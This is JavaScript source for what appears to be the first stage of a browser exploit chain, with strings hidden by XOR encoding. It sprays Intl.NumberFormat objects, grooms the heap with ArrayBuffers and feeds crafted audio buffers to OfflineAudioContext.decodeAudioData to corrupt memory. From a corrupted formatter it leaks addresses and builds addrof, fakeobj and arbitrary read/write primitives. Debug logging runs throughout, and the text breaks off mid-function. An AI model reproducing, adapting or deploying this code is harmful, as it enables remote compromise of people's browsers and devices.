let r = {};
window.log("[Stage 1]");
const x = globalThis.moduleManager.getModuleByName(([88, 90, 91, 95, 93, 95, 93, 91, 9, 91, 95, 93, 90, 84, 15, 12, 12, 9, 93, 8, 88, 90, 8, 91, 9, 84, 8, 14, 84, 94, 92, 95, 93, 14, 93, 11, 88, 95, 89, 90].map(x => {
    return String.fromCharCode(x ^ 109);
}).join(""))),
    {
        N: G,
        Vt: m,
        v: o
    } = globalThis.moduleManager.getModuleByName(([120, 122, 123, 127, 125, 127, 125, 123, 41, 123, 127, 125, 122, 116, 47, 44, 44, 41, 125, 40, 120, 122, 40, 123, 41, 116, 40, 46, 116, 126, 124, 127, 125, 46, 125, 43, 120, 127, 121, 122].map(x => {
        return String.fromCharCode(x ^ 77);
    }).join(""))),
    P = globalThis.moduleManager.getModuleByName(([69, 64, 66, 66, 77, 23, 21, 71, 22, 69, 65, 69, 77, 22, 21, 70, 21, 76, 18, 64, 68, 22, 17, 70, 76, 67, 18, 66, 64, 66, 16, 64, 16, 67, 65, 77, 71, 17, 22, 68].map(x => {
        return String.fromCharCode(x ^ 116);
    }).join("")));
class k {
    constructor(t) {
        window.log(`[Stage 1] k class constructor called`);
        this.Bi = t, this._r = {
            a: !1
        }, this.Wr = 0, this.yr = !1
    }
    hr(t, i, n = 0) {
        
        let r = "";
        for (let s = 0; s < i; s += 8) {
            const i = this.br(t + s + n),
                a = this.br(t + s + n + 4);
            r += (G(t + s)) + ([71].map(x => {
                return String.fromCharCode(x ^ 111)
            }).join("")) + (G(s)) + ([71, 84, 78].map(x => {
                return String.fromCharCode(x ^ 110)
            }).join("")) + (e = i, o = a, ([87, 31].map(x => {
                return String.fromCharCode(x ^ 103)
            }).join("")) + (o.toString(16)) + ([121, 121, 121, 121, 121, 121, 121, 121].map(x => {
                return String.fromCharCode(x ^ 73)
            }).join("")) + (e.toString(16)).slice(-8)) + ([70].map(x => {
                return String.fromCharCode(x ^ 76)
            }).join(""))
        }
        var e, o
    }
    wr(t, i, n) {
        for (let r = 0; r < n; r += 4) this.dr(t + r, i)
    }
    gr(t, i, n) {
        if (n % 4 != 0) throw new Error("");
        this.yr = !0;
        for (let r = 0; r < n; r += 4) this.dr(t.H(r).W(), this.br(i.H(r).W()));
        this.yr = !1
    }
    ir(t) {
        // window.log(`[Stage 1] k.ir() - reading 32-bit from Int64`);
        this.yr = !0;
        const i = this.br(t.W());
        return this.yr = !1, i
    }
    Ur(t) {
        // window.log(`[Stage 1] k.Ur() - reading Int64 from Int64`);
        this.yr = !0;
        const i = this.br(t.W()),
            n = this.br(t.H(4).W());
        return this.yr = !1, new m(i, n)
    }
    mr(t) {
        // window.log(`[Stage 1] k.mr() - reading double as pointer`);
        this.yr = !0;
        const i = this.br(t.W()),
            n = this.br(t.H(4).W());
        return this.yr = !1, x.T(i, n)
    }
    Ar(t) {
        const i = t.it % 4;
        t = t.Bt(i), this.yr = !0;
        const n = this.br(t.W()) >> 8 * i & (1464496978 ^ 1464497069);
        return this.yr = !1, n
    }
    Tr(t, i = (762274105 ^ 762273849)) {
        let n = "";
        for (; n.length < i;) {
            const i = this.Ar(t.H(n.length));
            if (0 === i) break;
            n += String.fromCharCode(i)
        }
        return n
    }
    Pr(t, i) {
        let n = "";
        for (; n.length < i;) {
            const i = this.Ar(t.H(n.length));
            n += String.fromCharCode(i)
        }
        return n
    }
    br(t) {
        return -1
    }
    Jr(t, i) { }
    write32x2(t, i, n) {
        this.dr(t, i), this.dr(t + 4, n)
    }
    ti(t, i) { }
    dr(t, i) { }
    Sr(t) {
        const i = t % 4;
        let n;
        return n = !0 === this.yr ? x.q(t, -i) : t - i, this.br(n) >> 8 * i & (1198608761 ^ 1198608774)
    }
    nr(t) {
        const i = this.br(t),
            n = this.br(t + 4);
        if (n > o) throw new Error("");
        return x.T(i, n)
    }
    Dr(t, i = !1) {
        const n = this.br(t);
        let r = this.br(t + 4);
        return (!0 === i || P.zn.versionFlags.zohDDd) && (r &= o), x.T(n, r)
    }
    readInt64FromOffset(t) {
        window.log(`[Stage 1] k.readInt64FromOffset(${t})`);
        const i = this.br(t),
            n = this.br(t + 4);
        return new m(i, n)
    }
    Er(t, i = (1665348973 ^ 1665348717)) {
        let n = (812406617 ^ 1335077030);
        ([88, 67, 91, 84, 83, 68].map(x => {
            return String.fromCharCode(x ^ 54);
        }).join("")) == typeof i && (n = i);
        let r = "";
        for (; r.length < n;) {
            const i = this.Sr(t + r.length);
            if (0 === i) break;
            r += String.fromCharCode(i)
        }
        return r
    }
    Nr(t, i) {
        let n = "";
        for (; n.length < i;) {
            const i = this.Sr(t + n.length);
            n += String.fromCharCode(i)
        }
        return n
    }
    tr(t) {
        // window.log(`[Stage 1] k.tr() - addrof primitive called`);
        this._r.a = t;
        const i = this.nr(this.Wr);
        return this._r.a = null, i
    }
    zr() { }
    cleanup() { window.log(`[Stage 1] k.cleanup() called`), this.zr() }
    pr(t) {
        // window.log(`[Stage 1] k.pr() - fakeobj from string`);
        const i = new DataView(new ArrayBuffer(t.length + 1));
        x.D(i);
        for (let n = 0; n < t.length; n++) i.setUint8(n, t.charCodeAt(n));
        return this.Mr(i)
    }
    Or(t, i = !1) {
        // window.log(`[Stage 1] k.Or() - allocControlledBuffer size=${t}, i=${i}`);
        const n = new ArrayBuffer(t),
            r = new Uint8Array(n);
        x.D(n);
        const e = this.tr(r),
            o = this.Dr(e + P.zn.versionFlags.oGn3OG);
        if (window.log(`[Stage 1] k.Or() - backing store at ${x.N(o)}`), !0 === i) {
            const t = this.tr(n),
                i = this.Dr(t + P.zn.versionFlags.CN3rr_);
            let r = this.br(i + P.zn.versionFlags.EMDU4o);
            r += 32, this.dr(i + P.zn.versionFlags.EMDU4o, r)
        }
        return o
    }
    Mr(t, i = !1) {
        // window.log(`[Stage 1] k.Mr() - fakeobj called`);
        t instanceof ArrayBuffer && (t = new Int8Array(t));
        const n = this.tr(t);
        return window.log(`[Stage 1] k.Mr() - addrof result: ${x.N(n)}`), this.Dr(n + P.zn.versionFlags.oGn3OG, i)
    }
    Br(t, ...i) {
        // window.log(`[Stage 1] k.Br() - withTempOverrides called, ${i.length} overrides`);
        const n = new Array(i.length + 10);
        for (let t = 0; t < i.length; t++) n[t] = this.readInt64FromOffset(i[t].Ir);
        try {
            for (let t = 0; t < i.length; t++) this.Jr(i[t].Ir, i[t].Zt);
            t()
        } finally {
            for (let t = 0; t < i.length; t++) this.Jr(i[t].Ir, n[t])
        }
    }
}
class z extends k {
    constructor(t, i) {
        window.log(`[Stage 1] z class constructor called - setting up exploit primitive wrapper`);
        super(t), this.Ii = i, this.Wr = x.K(this.Ii.tA(this._r)) + P.zn.versionFlags.fGOrHX;
        window.log(`[Stage 1] z class - Wr set to: ${x.N(this.Wr)}`)
    }
    _i(t) {
        return !0 === this.yr ? x.X(t) : x.O(t)
    }
    br(t) {
        return this.Ii.br(this._i(t))
    }
    dr(t, i) {
        this.Ii.dr(this._i(t), i)
    }
    ti(t, i) {
        this.Ii.dr(this._i(t), i >>> 0), this.Ii.dr(this._i(t) + BigInt(4), i / 4294967296 >>> 0)
    }
    Jr(t, i) {
        this.Ii.dr(this._i(t), i.it), this.Ii.dr(this._i(t) + BigInt(4), i.et)
    }
    write32x2(t, i, n) {
        this.Ii.dr(this._i(t), i), this.Ii.dr(this._i(t) + BigInt(4), n)
    }
    read32(t) {
        return this.br(t)
    }
    read32FromInt64(t) {
        return this.ir(t)
    }
    readInt64FromInt64(t) {
        return this.Ur(t)
    }
    readStringFromInt64(t, i) {
        return this.Tr(t, i)
    }
    readByte(t) {
        return this.Ar(t)
    }
    readRawBigInt(t) {
        return this.nr(t)
    }
    readDoubleAsPointer(t, i) {
        return this.Dr(t, i)
    }
    readString(t, i) {
        return this.Er(t, i)
    }
    fakeobj(t, i) {
        return this.Mr(t, i)
    }
    addrof(t) {
        return this.tr(t)
    }
    write32(t, i) {
        return this.dr(t, i)
    }
    writeInt64ToOffset(t, i) {
        return this.Jr(t, i)
    }
    copyBigInt(t, i) {
        return this.ti(t, i)
    }
    withTempOverrides(t, ...i) {
        return this.Br(t, ...i)
    }
}
class C {
    constructor() {
        this.rn = new ArrayBuffer(16), this.en = new DataView(this.rn)
    }
    un(t) {
        return this.en.setInt16(0, t, !0), this.en.getInt16(0, !0)
    }
    on(t) {
        return this.en.setUint16(0, t, !0), this.en.getUint16(0, !0)
    }
    sn(t) {
        return this.en.setUint32(0, t, !0), this.en.getUint32(0, !0)
    }
    hn(t, i) {
        return this.en.setFloat64(0, t, !0), this.en.setUint32(0, i, !0), this.en.getFloat64(0, !0)
    }
    cn(t, i) {
        return this.en.setFloat64(0, t, !0), this.en.setUint32(4, i, !0), this.en.getFloat64(0, !0)
    }
    fn(t) {
        for (let i = 0; i < 4; i++) {
            const n = t.charCodeAt(i);
            if (Number.isNaN(n)) throw new Error("");
            this.en.setUint16(2 * i, n, !0)
        }
        return this.en.getBigUint64(0, !0)
    }
    an(t) {
        return this.en.setFloat32(0, t, !0), this.en.getUint32(0, !0)
    }
    wn(t) {
        return this.en.setBigUint64(0, t, !0), this.en.getFloat64(0, !0)
    }
    gn(t, i) {
        return this.en.setBigUint64(0, t, !0), this.en.setUint8(0, Number(i)), this.en.getBigUint64(0, !0)
    }
    ln(t, i) {
        return this.en.setBigUint64(0, t, !0), this.en.setUint32(0, Number(i), !0), this.en.getBigUint64(0, !0)
    }
    bn(t, i) {
        return this.en.setUint32(0, t, !0), this.en.setUint8(0, Number(i)), this.en.getUint32(0, !0)
    }
    Un(t, i) {
        return this.en.setUint32(0, t, !0), this.en.setUint32(0, Number(i), !0), this.en.getUint32(0, !0)
    }
    mn(t, i) {
        return this.en.setBigUint64(0, t, !0), this.en.setUint32(0, Number(i), !0), this.en.getBigUint64(0, !0)
    }
    ki(t) {
        return this.en.setBigInt64(0, t, !0), this.en.getBigUint64(0, !0)
    }
}
class M {
    constructor(t, i, n, r, e, o, s, a) {
        window.log(`[Stage 1] M class constructor - corrupted Intl.NumberFormat primitive`);
        this.vi = t, this.Fi = i, this.Ni = n, this.zi = r, this.pi = e, this.Ci = o, this.xi = s, this.Mi = a, this.Oi = new C;
        window.log(`[Stage 1] M class - vi=${x.N(t)}, Fi baseVal=${i.baseVal}, xi=${x.N(s)}`)
    }
    Wi(t) {
        this.zi.baseVal = Number(t >> BigInt(32)), this.Fi.baseVal = Number(t - BigInt(28) & BigInt(([1, 73, 119, 119, 119, 119, 119, 119, 119, 119].map(x => {
            return String.fromCharCode(x ^ 49);
        }).join(""))))
    }
    Vi(t) {
        this.Oi.en.setUint32(0, Number(t), !0), this.Ci.baseVal = this.Oi.en.getUint32(0, !0)
    }
    $i() {
        return this.Oi.en.setUint32(0, this.Ci.baseVal, !0), this.Oi.en.getUint32(0, !0)
    }
    dr(t, i) {
        this.Wi(t), this.Vi(i)
    }
    Hi(t, i) {
        this.Wi(t), this.Vi(i & BigInt(([83, 27, 37, 37, 37, 37, 37, 37, 37, 37].map(x => {
            return String.fromCharCode(x ^ 99);
        }).join("")))), this.Wi(t + BigInt(4)), this.Vi(i >> BigInt(32))
    }
    Er(t, i = (1983998776 ^ 1983998008)) {
        let n = "";
        for (let r = 0; r < i; r++) {
            const i = this.Sr(t + BigInt(r));
            if (0 === i) break;
            n += String.fromCharCode(i)
        }
        return n
    }
    br(t) {
        return this.Wi(t), this.$i()
    }
    ji(t) {
        return (1112564076 ^ 1112579731) & this.br(t)
    }
    Sr(t) {
        return (2016893289 ^ 2016893334) & this.br(t)
    }
    Ki(t) {
        const i = this.br(t),
            n = this.br(t + BigInt(4));
        return BigInt(n) << BigInt(32) | BigInt(i)
    }
    tA(t) {
        window.log(`[Stage 1] M.tA() - address-of primitive called for object`);
        this.Mi[0] = t;
        const i = this.Ki(this.xi + BigInt(8)),
            n = this.Ki(i);
        return window.log(`[Stage 1] M.tA() - returning address: ${x.N(Number(n))}`), this.Mi[0] = null, n
    }
}
return r.si = async function (t) {
    window.log(`[Stage 1] === r.si entry point called - starting exploit ===`);
    const i = BigInt(([74, 2, 77, 60, 60, 60, 60, 60, 60, 60, 60, 60].map(x => {
        return String.fromCharCode(x ^ 122);
    }).join("")));

    function n(t) {
        return t & i
    }
    try {
        window.log(`[Stage 1] Starting main exploit IIFE`);
        const i = await async function () {
            window.log(`[Stage 1] Inside exploit IIFE`);
            const i = {
                Ji: null,
                Li: null
            },
                r = new OfflineAudioContext(2, (1261462879 ^ 1261488411), (1832209514 ^ 1832247342)),
                e = r.decodeAudioData.bind(r),
                o = [];
            r.decodeAudioData = async t => {
                const i = await e(t);
                return o.push(i), null
            };
            const s = (1331970635 ^ 1331976467);

            function a() {
                let t = 0;
                for (let i = 0; i < s; i++) try {
                    new Intl.NumberFormat(([46, 37, 61, 37, 41, 32, 44, 32, 59, 17].map(x => {
                        return String.fromCharCode(x ^ 74);
                    }).join("")), {})
                } catch (i) {
                    t += 1
                }
                if (t !== s) throw new Error("")
            }

            function c() {
                for (let t = 0; t < (1750692460 ^ 1750692508); t++) new ArrayBuffer((1447127853 ^ 1442933549))
            }
            async function h(t, i) {
                try {
                    window.log(`[Stage 1] h() - starting corruption at array index ${i}`);
                    const n = S(k, new T);
                    window.log(`[Stage 1] h() - S(k, new T) returned buffer size: ${n.byteLength}`);
                    const e = p(new ArrayBuffer((1397113677 ^ 1397097293)), (825849196 ^ 825851436), (946692948 ^ 946696852));
                    window.log(`[Stage 1] h() - S() and p() completed`);
                    const o = [],
                        h2 = [],
                        l2 = [];
                    for (let n = 0; n < s; n++) t[i + n] = new Intl.NumberFormat(([53, 62, 125, 5, 3].map(x => {
                        return String.fromCharCode(x ^ 80);
                    }).join("")), {}), o[n] = [new Intl.NumberFormat(([51, 56, 123, 3, 5].map(x => {
                        return String.fromCharCode(x ^ 86);
                    }).join("")), {}), new Intl.NumberFormat(([40, 35, 96, 24, 30].map(x => {
                        return String.fromCharCode(x ^ 77);
                    }).join("")), {}), new Intl.NumberFormat(([39, 44, 111, 23, 17].map(x => {
                        return String.fromCharCode(x ^ 66);
                    }).join("")), {})], h2.push([new Intl.NumberFormat(([46, 37, 102, 30, 24].map(x => {
                        return String.fromCharCode(x ^ 75);
                    }).join("")), {}), new Intl.NumberFormat(([54, 61, 126, 6, 0].map(x => {
                        return String.fromCharCode(x ^ 83);
                    }).join("")), {})]);
                    window.log(`[Stage 1] h() - Intl.NumberFormat spray done, calling c() and a()`);
                    h2.length = 0, c(), a();
                    for (let n = 0; n < s; n++) t[i + n].format(1), t[i + n].format(2), t[i + n].format(3);
                    window.log(`[Stage 1] h() - format calls done, calling c() and a() again`);
                    o.length = 0, c(), a();
                    window.log(`[Stage 1] h() - starting decodeAudioData loop (20 iterations)`);
                    for (let t2 = 0; t2 < 20; t2++) {
                        try { await r.decodeAudioData(e); } catch (t3) { window.log(`[Stage 1] h() - decodeAudioData(e) iter ${t2} error: ${t3.message}`); }
                        try { await r.decodeAudioData(e); } catch (t3) { window.log(`[Stage 1] h() - decodeAudioData(e) iter ${t2} error: ${t3.message}`); }
                        try {
                            await r.decodeAudioData(n)
                        } catch (t2) { }
                        if (t2 % 5 === 4) window.log(`[Stage 1] h() - decodeAudioData loop iteration ${t2 + 1}/20 done`);
                    }
                    window.log(`[Stage 1] h() - decodeAudioData loop done, searching for corruption`);
                    for (let n2 = i; n2 < t.length; n2++) {
                        const i2 = t[n2];
                        if (null === i2) continue;
                        const r2 = i2.format(1.02);
                        if (4 !== r2.length) {
                            window.log(`[Stage 1] h() - found corrupted Intl.NumberFormat at index ${n2}, result string length: ${r2.length}`);
                            let n3 = BigInt(r2.charCodeAt(19));
                            return n3 = n3 << BigInt(16) | BigInt(r2.charCodeAt(18)), n3 = n3 << BigInt(16) | BigInt(r2.charCodeAt(17)), n3 -= BigInt((2052666958 ^ 2052667254)), window.log(`[Stage 1] h() - extracted address: ${x.N(Number(n3))}`), {
                                Ri: [...t, ...o, ...h2, ...l2],
                                Xi: i2,
                                qi: n3
                            }
                        }
                    }
                    window.log(`[Stage 1] h() - NO corruption found, scanned ${t.length - i} entries`);
                    throw new Error("h(): no corruption found")
                } catch (err) {
                    window.log(`[Stage 1] h() - EXCEPTION: ${err.message || err}`);
                    throw err;
                }
            }
            const l = (1598836557 ^ 1598852957),
                f = 1,
                w = 2,
                u = 3,
                g = 5,
                d = 6,
                b = 10,
                B = (1248819300 ^ 503254354),
                I = BigInt((1329753424 ^ 1329753816)),
                _ = BigInt((808924234 ^ 808925058)),
                m = BigInt(8),
                y = BigInt(12),
                U = BigInt(10),
                E = BigInt(24),
                k = new ArrayBuffer((1496413524 ^ 1496397140)),
                v = new C;
            class F {
                Gi(t) {
                    if (t !== this.Qi.length) throw new Error("")
                }
                Yi(t) {
                    if (0 === t.length) return 0;
                    if (this.Zi + t.length >= this.Qi.length && (this.Gi(this.Zi + t.length + 1), this.Zi + t.length >= this.Qi.length)) throw new Error("");
                    return this.Qi.set(t, this.Zi), this.Zi += t.length, t.length
                }
                te(t) {
                    if (this.Zi < 0) throw new Error("");
                    if (this.Zi > this.Qi.length) throw new Error("");
                    this.Zi = t
                }
                ie() {
                    this.Zi = 0
                }
                ne() {
                    return this.Qi.length
                }
                re() {
                    return this.Zi
                }
                ee() {
                    return this.Qi.subarray()
                }
                constructor(t) {
                    this.Qi = new Uint8Array(t), this.Zi = 0, this.oe = new ArrayBuffer(32), this.se = new Uint8Array(this.oe), this.ae = new DataView(this.oe)
                }
                ce(t) {
                    this.ae.setUint32(0, t, !1), this.Yi(this.se.subarray(0, 4))
                }
                he(t) {
                    this.ae.setUint16(0, t, !1), this.Yi(this.se.subarray(0, 2))
                }
                le(t, i) {
                    const n = new Uint8Array(i);
                    n.fill(t), this.Yi(n)
                }
                fe(t) {
                    this.Yi(new Uint8Array([t]))
                }
                we(t) {
                    let i = 0;
                    for (; i < t.length;) {
                        const n = t.charCodeAt(i);
                        if (0 != ((1131695413 ^ 1131721269) & n)) throw new Error("");
                        this.fe(n), i++
                    }
                }
                ue(t) {
                    this.te(t)
                }
                ge() {
                    this.ie()
                }
                de() {
                    return this.ne()
                }
                be() {
                    return this.re()
                }
                Be() {
                    return this.ee()
                }
            }
            class N {
                Ie(t) { }
                _e(t) { }
            }

            function S(t, i) {
                const n = new F(t),
                    r = [{
                        tag: f,
                        me: void 0,
                        ye: void 0
                    }, {
                        tag: u,
                        me: void 0,
                        ye: void 0
                    }, {
                        tag: g,
                        me: void 0,
                        ye: void 0
                    }, {
                        tag: d,
                        me: void 0,
                        ye: void 0
                    }, {
                        tag: b,
                        me: void 0,
                        ye: void 0
                    }],
                    e = 16 + 12 * r.length;
                n.ue(e);
                for (const t of r) {
                    const r = n.be();
                    switch (t.me = r, t.tag) {
                        case f: {
                            const t = {
                                Ue: 0,
                                Ee: 0,
                                ke: B,
                                ve: 0,
                                Fe: 0,
                                Ne: 0,
                                Se: 0
                            };
                            n.he(t.Ue), n.he(t.Ee), n.ce(t.ke), n.ce(t.ve), n.ce(t.Fe), n.ce(t.Ne), n.ce(t.Se);
                            break
                        }
                        case u:
                            n.he(0), n.le("\0", 16), n.le("\0", 40), n.ce(0), n.ce(0), n.ce(0), n.ce(0);
                            break;
                        case g:
                            n.ce(0);
                            break;
                        case d:
                            i.Ie(n);
                            break;
                        case b:
                            i._e(n)
                    }
                    t.ye = n.be() - r
                }
                const o = n.be();
                n.ue(0), n.ce(o), n.ce(B), n.ce(r.length), n.ce(0);
                for (const t of r) n.ce(t.tag), n.ce(t.me), n.ce(t.ye);
                return n.Be().buffer.slice(0, o)
            }
            class A extends N {
                constructor(t, i) {
                    super(), this.Ae = t, this.Te = i
                }
                Ie(t) {
                    const i = [],
                        n = (1245868108 ^ 1245856356);
                    if (this.Ae < BigInt(4294967296)) throw new Error("");
                    let r = Number((this.Ae >> BigInt(32)).toString());
                    v.on(r) % 2 == 0 && (r += 1);
                    let e = v.un(-(1346467123 ^ 1346453811));
                    e -= 16 * r;
                    let o = v.un(24 * r + 72);
                    if (v.on(o) % 16 != 0) throw new Error("");
                    o += 16, e += o;
                    const s = Math.floor(e / 16),
                        a = v.un(8 * s);
                    let c = this.Ae - BigInt(a.toString());
                    c -= BigInt(v.on(8 * r).toString());
                    const h = (t, i) => t <= i ? t : i,
                        f = (t, i) => Number(BigInt.asUintN(t, i).toString()),
                        w = h(BigInt((4294967296 + (1364288331 ^ -1364288332))), c);
                    i.push({
                        ze: 0,
                        pe: f(32, w),
                        Ce: l
                    }), c -= w;
                    let u = r;
                    for (; u > 0;)
                        if (u -= 1, c !== BigInt(0)) {
                            const t = h(BigInt((4294967296 + (1833069881 ^ -1833069882))), c);
                            i.push({
                                ze: 1,
                                pe: f(32, t),
                                Ce: l
                            }), c -= t
                        } else i.push({
                            ze: 1,
                            pe: 0,
                            Ce: l
                        });
                    i.push({
                        ze: v.on(s),
                        pe: 0,
                        Ce: l
                    }), i.push({
                        ze: 1,
                        pe: 0,
                        Ce: l
                    }), i.push({
                        ze: 12,
                        pe: 0,
                        Ce: l
                    });
                    let g = 0;
                    for (const t of i) g += v.un(t.ze);
                    let d = 0;
                    if (g < 0) d += -1 * g, d += (1131962233 ^ 1131961432);
                    else {
                        if (d > (1817196108 ^ 1817195885)) throw new Error("");
                        d += (1732462198 ^ 1732461911) - d
                    }
                    if (i.push({
                        ze: d,
                        pe: 0,
                        Ce: l
                    }), 24 * i.length > n) throw new Error("");
                    for (; 24 * i.length !== n;) i.push({
                        ze: 0,
                        pe: 0,
                        Ce: l
                    });
                    t.ce(i.length);
                    for (const n of i) t.ce(n.ze), t.ce(0), t.ce(0), t.ce(n.pe), t.ce(0), t.he(n.Ce), t.ce(0)
                }
                _e(t) {
                    t.ce(this.Te[1]), t.ce(this.Te[0])
                }
            }
            class T extends N {
                constructor() {
                    super()
                }
                Ie(t) {
                    const i = [];
                    let n = -(1281700471 ^ 1281695863);
                    n += (1848864878 ^ 1848866798), n = Math.floor(n / 16), i.push({
                        ze: 0,
                        pe: 0,
                        Ce: l
                    }), i.push({
                        ze: 0,
                        pe: 0,
                        Ce: l
                    }), i.push({
                        ze: v.on(n),
                        pe: 0,
                        Ce: l
                    }), i.push({
                        ze: 1,
                        pe: (4294967296 + (1731682929 ^ -1731682930)),
                        Ce: 0
                    });
                    const r = Math.floor(-(1937008452 ^ 1937008428));
                    i.push({
                        ze: v.on(r),
                        pe: (1882552910 ^ 1882556797),
                        Ce: 0
                    }), i.push({
                        ze: 2,
                        pe: (1313501509 ^ 1313505910),
                        Ce: 0
                    }), i.push({
                        ze: 2,
                        pe: (1145467467 ^ 1145471352),
                        Ce: 0
                    });
                    let e = 0;
                    for (const t of i) e += v.un(t.ze);
                    const o = Math.floor((1431263313 ^ 1431263565));
                    let s = 0;
                    if (e < 0) s += -1 * e, s += o;
                    else {
                        if (s > o) throw new Error("");
                        s += o - s
                    }
                    for (i.push({
                        ze: s,
                        pe: 0,
                        Ce: 0
                    }); 24 * i.length != (1161251638 ^ 1161251822);) i.push({
                        ze: 0,
                        pe: 0,
                        Ce: 0
                    });
                    t.ce(i.length);
                    for (const n of i) t.ce(n.ze), t.ce(0), t.ce(0), t.ce(n.pe), t.ce(0), t.he(n.Ce), t.ce(0)
                }
                _e(t) {
                    t.ce((1365203545 ^ 1365203227)), t.ce((1450798932 ^ 1450798102)), t.ce((1331327860 ^ 1331331143)), t.ce((1514556777 ^ 1514584365))
                }
            }

            function p(t, i, n) {
                const r = new F(t);
                if (i % 24 != 0) throw new Error("");
                if (n % 16 != 0) throw new Error("");
                const e = i / 24,
                    o = n / 16;
                if (e >= o) throw new Error("");
                if (o >= (761620786 ^ 761599693)) throw new Error("");
                const s = [];
                for (let t = 0; t < e - 1; t++) s.push({
                    ze: 1
                });
                s.push({
                    ze: o - e
                });
                for (const t of s) t.pe = 0, t.xe = 1, t.Ce = l;
                s[0].pe = 19;
                const a = [{
                    tag: f,
                    me: void 0,
                    ye: void 0
                }, {
                    tag: w,
                    me: void 0,
                    ye: void 0
                }, {
                    tag: u,
                    me: void 0,
                    ye: void 0
                }, {
                    tag: g,
                    me: void 0,
                    ye: void 0
                }, {
                    tag: d,
                    me: void 0,
                    ye: void 0
                }, {
                    tag: b,
                    me: void 0,
                    ye: void 0
                }],
                    c = 16 + 12 * a.length;
                r.ue(c);
                for (const t of a) {
                    const i = r.be();
                    switch (t.me = i, t.tag) {
                        case f: {
                            const t = {
                                Ue: 0,
                                Ee: 0,
                                ke: B,
                                ve: 0,
                                Fe: 0,
                                Ne: 0,
                                Se: 0
                            };
                            r.he(t.Ue), r.he(t.Ee), r.ce(t.ke), r.ce(t.ve), r.ce(t.Fe), r.ce(t.Ne), r.ce(t.Se);
                            break
                        }
                        case w: {
                            const t = [
                                [([12, 33, 37, 32, 33, 54, 23, 33, 33, 32].map(x => {
                                    return String.fromCharCode(x ^ 68);
                                }).join("")), "0"],
                                [([8, 35, 46, 63, 52, 61, 57, 40, 41, 15, 33, 34, 46, 38, 62].map(x => {
                                    return String.fromCharCode(x ^ 77);
                                }).join("")), "0"],
                                [([47, 2, 6, 3, 2, 21, 44, 2, 30].map(x => {
                                    return String.fromCharCode(x ^ 103);
                                }).join("")), ([81, 65, 81, 65, 81, 65, 81].map(x => {
                                    return String.fromCharCode(x ^ 97);
                                }).join(""))],
                                [([0, 19, 22, 23, 58, 51, 38].map(x => {
                                    return String.fromCharCode(x ^ 67);
                                }).join("")), "0"]
                            ];
                            r.ce(t.length);
                            for (const [i, n] of t) r.fe(0), r.ce(i.length), r.ce(n.length), r.we(i), r.we(n);
                            break
                        }
                        case u:
                            r.he(0), r.le("\0", 16), r.le("\0", 40), r.ce(19), r.ce(0), r.ce(0), r.ce(0);
                            break;
                        case g:
                            r.ce(0);
                            break;
                        case d: {
                            const t = -1;
                            r.ce(s.length);
                            for (const i of s) r.ce(i.ze), r.ce(t), r.ce(t), r.ce(i.pe), r.ce(i.xe), r.he(i.Ce), r.ce(0);
                            break
                        }
                        case b: {
                            r.ce(19);
                            const t = r.be() + 4;
                            r.ce(t), r.le("\0", 19);
                            let i = r.be() + 8;
                            for (let t = 0; t < o; t++) r.ce(0), r.ce(i), i += 8;
                            break
                        }
                    }
                    t.ye = r.be() - i
                }
                const h = r.be();
                r.ue(0), r.ce(h), r.ce(B), r.ce(a.length), r.ce(0);
                for (const t of a) r.ce(t.tag), r.ce(t.me), r.ce(t.ye);
                return r.Be().buffer.slice(0, h)
            }
            window.log(`[Stage 1] All helper functions/classes defined, entering main async`);
            return await async function () {
                window.log(`[Stage 1] Main async starting, attempting h(e, s)`);
                const e = [];
                let s = 0,
                    a = 0,
                    c = null;
                for (a = 0; a < 12; a++) {
                    try {
                        window.log(`[Stage 1] Attempt ${a + 1}/12 to call h(e, s) with s=${s}`);
                        c = await h(e, s);
                        window.log(`[Stage 1] h(e, s) succeeded!`);
                        break
                    } catch (t) {
                        window.log(`[Stage 1] h(e, s) failed: ${t.message}, s was ${s}, new s = e.length = ${e.length}`);
                        s = e.length
                    }
                }
                if (null === c) throw new Error("");
                const l = await async function (e) {
                    const o = new ArrayBuffer((1933993560 ^ 1933977176)),
                        s = new ArrayBuffer((1467382354 ^ 1467365970)),
                        a = p(o, (1767200610 ^ 1767201826), (1396920442 ^ 1396929658));
                    class c {
                        async init() {
                            const t = e.qi + I,
                                i = t + m,
                                o = t + E,
                                c = e.qi + _,
                                h = async (t, i) => {
                                    {
                                        const n = S(s, new A(t, [i, 0]));
                                        let o = 0;
                                        const c = e.Xi.format(1 / 0);
                                        do {
                                            if (o += 1, o > 20) throw Error(0);
                                            for (let t = 0; t < 12; t++) await r.decodeAudioData(a);
                                            try {
                                                await r.decodeAudioData(n)
                                            } catch (t) { }
                                        } while (c === e.Xi.format(1 / 0))
                                    }
                                };
                            await h(i, (893998410 ^ 893998664)), await h(o, Number(c & BigInt(([7, 79, 113, 113, 113, 113, 113, 113, 113, 113].map(x => {
                                return String.fromCharCode(x ^ 55);
                            }).join(""))))), await h(o + BigInt(4), Number(c >> BigInt(32)));
                            {
                                const t = e.Xi.format(1 / 0),
                                    i = (E - U) / BigInt(2);
                                let n = BigInt(0);
                                for (let r = 3; r >= 0; r--) n = n << BigInt(16) | BigInt(t.charCodeAt(Number(i) + r))
                            }
                            await h(i, (844327525 ^ 844328557));
                            const l = e.Xi.format(1 / 0);
                            this.Pe = n(this.Me(l, 0))
                        }
                        constructor() {
                            this.Oe = !1, this.We = null, this.De = null, this.Ve = null, this.Pe = null, this.$e = new Uint16Array(new ArrayBuffer(32)), this.He = new DataView(this.$e.buffer)
                        }
                        hr(t = (862091577 ^ 862091833)) {
                            for (let i = 0; i < Math.min(t, Number(this.De)); i += 8);
                        }
                        je(t, i) {
                            if (i = BigInt(i), null === this.We) throw new Error("");
                            if (null === this.De) throw new Error("");
                            if (null === this.Ve) throw new Error("");
                            const n = t + i;
                            if (n < this.We) throw new Error("");
                            if (n >= this.We + this.De) throw new Error("")
                        }
                        Ke() {
                            this.Ve = e.Xi.format(NaN)
                        }
                        br(t) {
                            if ((t = Number(t)) % 2 != 0) throw new Error("");
                            this.je(this.We, t), t /= 2;
                            for (let i = 0; i < 2; i++) {
                                const n = this.Ve.charCodeAt(t + i);
                                if (Number.isNaN(n)) throw new Error("");
                                this.$e[i] = n
                            }
                            return this.He.getUint32(0, !0)
                        }
                        Er(t = 0, i = (1632710982 ^ 1632711342)) {
                            t = Number(t), this.je(this.We, t);
                            let n = "",
                                r = 0,
                                e = t % 2 != 0;
                            for (; ;) {
                                const o = this.Ve.charCodeAt(Math.floor((t + r) / 2)),
                                    s = (2037075298 ^ 2037075357) & o,
                                    a = o >>> 8;
                                if (!1 === e) {
                                    if (0 === s) break;
